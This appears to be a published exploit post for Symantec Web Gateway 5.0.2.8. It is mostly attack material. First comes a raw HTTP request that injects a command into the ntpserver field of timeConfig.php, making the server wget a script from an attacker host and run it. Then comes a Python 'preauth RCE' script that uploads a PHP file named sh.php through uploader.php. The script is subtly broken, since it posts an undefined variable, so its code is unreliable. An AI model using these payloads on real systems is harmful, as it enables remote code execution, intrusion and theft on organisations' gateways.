# Vendor: www.symantec.com
# Vulnerable software: www.symantec.com
# Repo: https://github.com/c610/free/




POST /spywall/timeConfig.php HTTP/1.1
Host: 192.168.216.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Origin: https://192.168.216.133
Connection: close
Referer: https://192.168.216.133/spywall/timeConfig.php
Cookie: PHPSESSID=8f076c1f7bac2b403cf39711fd301533
Upgrade-Insecure-Requests: 1

posttime=1585228657&saveForm=Save&timesync=1&ntpserver=qweqwe.com;$(wget%20http://192.168.1.170/a.sh%20-O%20/tmp/a.sh;sh%20/tmp/a.sh);#&timezone=5

------------------------------------------

# Title: Preauth RCE in Symantec Web Gateway 5.0.2.8
# Vendor: www.symantec.com
# Vulnerable software: www.symantec.com
# Repo: https://github.com/c610/free/



#!/usr/bin/env python
# 27.03.2020 by code610
#
# more : https://twitter.com/CodySixteen
#        https://code610.blogspot.com
#
# to use this bug:
#   - uploads folder must exists on remote host
#   - and it must be writable
#
# have fun
#
import sys, re
import requests

target = sys.argv[1]

def main():
  print &#039;      seemantech.py - vs - %s&#039; % ( target )
  print &#039;&#039;

  baseUrl = target
  uploadUrl = target + &#039;/uploads/&#039;

  checkBase = requests.get(target,verify=False)
  check_status = checkBase.status_code

  if check_status == 200:
    print &#039;[+] target alive, checking uploads&#039;

    checkUpload = requests.get(uploadUrl, verify=False)
    isthereupload = checkUpload.status_code

    if isthereupload == 200:
      print &#039;[+] uploads exists! continuing...&#039;

      uploader = target + &#039;/spywall/uploader.php&#039;
      upshell = open(&#039;sh.php&#039;,&#039;w&#039;)
      upshell.write(&#039;<?php phpinfo();&#039;)
      upshell.close()
      up_data = {
        &#039;file&#039;:open(&#039;sh.php&#039;,&#039;rb&#039;)
      }

      upme = requests.post(uploader, files=files, verify=False)

# run me:
if __name__ == &#039;__main__&#039;:
  main()

